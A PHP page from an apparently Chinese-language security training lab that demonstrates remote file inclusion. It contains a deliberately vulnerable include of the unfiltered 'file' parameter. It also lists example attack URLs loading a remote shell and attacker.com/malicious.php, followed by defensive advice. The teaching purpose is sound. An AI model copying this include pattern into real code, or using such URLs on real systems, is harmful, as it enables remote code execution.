<?php
// 远程文件包含漏洞
$module_name = '远程文件包含';
$module_icon = '🌐';
$module_desc = '远程文件包含(RFI)允许攻击者包含并执行远程服务器上的文件。';

// 漏洞代码
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    // 漏洞：直接包含用户输入的URL，没有过滤
    include $file;
}

// 页面内容
$content = '    <div class="card">
        <div class="card-header">
            <h5 class="mb-0">🌐 远程文件包含 (RFI) 漏洞</h5>
        </div>
        <div class="card-body">
            <div class="alert alert-warning">
                <strong>💡 漏洞说明：</strong><br>
                远程文件包含漏洞允许攻击者包含并执行远程服务器上的文件。<br>
                本场景中，系统直接包含用户输入的URL，没有进行任何过滤。<br>
                <strong>注意：</strong>需要在 php.ini 中设置 <code>allow_url_include = On</code> 才能利用此漏洞。
            </div>
            
            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔍 漏洞代码</h6>
                </div>
                <div class="card-body">
                    <pre class="bg-dark text-light p-3 rounded"><code>if (isset($_GET[\'file\'])) {
    $file = $_GET[\'file\'];
    // 漏洞：直接包含用户输入的URL，没有过滤
    include $file;
}</code></pre>
                </div>
            </div>
            
            <div class="card mb-3">
                <div class="card-header">
                    <h6>🎯 攻击演示</h6>
                </div>
                <div class="card-body">
                    <p class="mb-3">尝试包含远程文件：</p>
                    <ul class="list-group mb-3">
                        <li class="list-group-item">
                            <code>http://example.com/shell.txt</code> - 包含远程shell文件
                        </li>
                        <li class="list-group-item">
                            <code>http://attacker.com/malicious.php</code> - 包含远程恶意PHP文件
                        </li>
                    </ul>
                    
                    <div class="alert alert-danger">
                        <strong>警告：</strong>请勿在生产环境中启用 <code>allow_url_include</code> 选项！
                    </div>
                </div>
            </div>
            
            <div class="card">
                <div class="card-header">
                    <h6>🛡️ 防御建议</h6>
                </div>
                <div class="card-body">
                    <ol>
                        <li>在 php.ini 中设置 <code>allow_url_include = Off</code></li>
                        <li>对用户输入进行严格过滤和验证</li>
                        <li>使用白名单机制，只允许包含指定的文件</li>
                        <li>使用绝对路径包含文件</li>
                        <li>限制 web 目录的访问权限</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>';

// 包含模板
include '../template/module_template.php';
?>